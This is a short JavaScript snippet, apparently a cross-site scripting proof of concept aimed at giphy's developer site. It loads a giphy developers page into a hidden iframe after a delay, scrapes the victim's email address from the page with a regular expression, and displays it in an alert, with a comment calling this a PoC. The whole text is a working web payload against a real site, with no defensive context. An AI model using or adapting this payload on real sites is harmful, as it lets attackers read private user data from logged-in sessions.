setTimeout(function() {
    var profileIframe = document.createElement('iframe');
    profileIframe.setAttribute('src', 'https://developers.giphy.com/docs/sdk');
    profileIframe.setAttribute('id', 'pi');
    document.body.appendChild(profileIframe);
    //Extract their email as PoC
    profileIframe.onload = function() {
        var d = document.getElementById('pi').contentWindow.document.body.innerHTML;
        var matches = /value="([^"]+)" name="login__Text-lkmy7z-5 iovZjr"/.exec(d);
        alert(matches[1]);
    }
}, 9000);
